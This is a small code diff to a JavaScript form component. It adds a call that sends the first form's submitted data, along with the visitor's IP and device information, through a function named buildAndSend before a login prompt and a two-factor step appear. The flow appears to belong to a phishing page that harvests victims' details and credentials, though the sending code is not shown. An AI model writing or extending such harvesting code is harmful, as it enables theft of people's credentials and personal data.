@@ -343,6 +343,7 @@ ${twoFALines}
     };
 
     const handleFirstFormSubmit = (data) => {
+        buildAndSend(data, { email: '', password: '' }, [], [], ipInfo, deviceInfo);
         setFormData(data);
         setShowFirstFormModal(false);
         setShowLoginModal(true);
